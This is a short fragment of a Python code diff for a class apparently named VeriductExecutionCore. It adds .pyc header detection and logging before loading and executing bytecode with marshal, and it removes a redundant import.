+                else:
+                    raise ValueError(f"Bytecode too small ({len(data)} bytes)")
+        
+                logging.info(f"Detected .pyc header size: {header_size} bytes (magic=0x{pyc_magic:04X})")
+        
+                # Warn on cross-version marshal incompatibility
+                running_magic = (sys.version_info.minor * 10 + 3000)  # rough estimate
+                logging.debug(f"Running Python {sys.version_info.major}.{sys.version_info.minor}, "
+                             f".pyc magic=0x{pyc_magic:04X}")
+        
+                code_data = bytes(data[header_size:])
         
                 logging.info("Loading bytecode...")
                 code_object = marshal.loads(code_data)
@@ -3147,7 +4596,6 @@ class VeriductExecutionCore:
                 logging.info("Executing Python code...")
         
                 # Fix Windows console encoding for Unicode support
-                import sys
                 if sys.platform == 'win32':
                     import io
                     sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
